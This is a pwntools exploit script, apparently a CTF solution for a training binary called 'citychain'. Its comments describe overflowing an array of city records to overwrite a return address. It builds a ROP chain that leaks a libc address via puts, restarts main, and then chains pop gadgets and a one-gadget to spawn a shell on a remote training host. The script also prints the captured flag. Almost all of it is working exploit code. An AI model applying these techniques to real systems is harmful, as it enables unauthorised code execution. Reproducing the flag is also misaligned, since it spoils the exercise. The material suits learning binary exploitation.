from pwn import *

context.arch = 'amd64'
#First, I noticed that the array of city is composed by only 1 element but we can add more cities. Adding the second city,
#we can overwrite the return address of the core/main function. So we can build a ROP chain to leak a libc address
#(the got entry of puts), print it using the function puts and then we can calculate the libc base address. Using the same chain, we can also restart the program
#and build a second chain to call the one gadget. The one gadget requires R12 and R15 to be 0, we put some values of city to zero to execute the pop gadgets in order
#to have R12 and R15 equal to 0. Finally I used also a RET gadget only to have a correct alignment (since in elevation we can have only
#4 byte numbers and we need the 8-byte address of the one gadget. The one gadget is at offset 0xe3afe from the libc base address.
#flag{D1dnT_kn0w_th4t_b1nsh_is_In_gulf_0f_Gu1n3a}

def add_city(name, latitude, longitude, population, area, elevation):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'City Name: ')
    p.sendline(name.encode())
    p.recvuntil(b'Latitude: ')
    p.sendline(str(latitude).encode())
    p.recvuntil(b'Longitude: ')
    p.sendline(str(longitude).encode())
    p.recvuntil(b'Population: ')
    p.sendline(str(population).encode())
    p.recvuntil(b'Area [m^2]: ')
    p.sendline(str(area).encode())
    p.recvuntil(b'Elevation [m]: ')
    p.sendline(str(elevation).encode())

def quit(needLeak):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    if(needLeak):
        leak_libc = p.read(6).ljust(8, b'\x00')
        print(leak_libc)
        leak_libc_n = u64(leak_libc)
        return leak_libc_n
    return 0

#p = process('./citychain')
p = remote('bin.training.offdef.it', 5003)
"""gdb.attach(p, '''
    b *0x00401114;
''')
input("wait")"""

OFFSET_LEAK_LIBC_BASE = 541728
POP_RDI = 4199891
PUTS_PLT = 4198560
READ_GOT = 4210720
PUTS_GOT = 4210712
POP_R14_R15 = 4199888
POP_R12 = 4199576
POP_R13_R14_R15 = 4199886
CORE_ADDRESS = 4199632
PUTS_IN_CORE = 4199661
START_MAIN = 4198704
ONE_GADGET_OFFSET = 0xe3afe
RET = 4198426

add_city('A'*10, 1.0, 2.0, 9, 8, 7)
add_city('B'*10, 1.0, 2.0, POP_R14_R15, POP_RDI, PUTS_GOT)
add_city('C'*10, 1.0, 2.0, 9, PUTS_PLT, START_MAIN)
leak_libc_n = quit(True)
print(hex(leak_libc_n))
add_city('D'*10, 1.0, 2.0, 9, 8, 7)
add_city('E'*10, 1.0, 2.0, POP_R13_R14_R15, POP_R12, 0)
one_gadget = leak_libc_n - OFFSET_LEAK_LIBC_BASE + ONE_GADGET_OFFSET
add_city('F'*10, 1.0, 2.0, one_gadget, 0, RET)
quit(False)

p.interactive()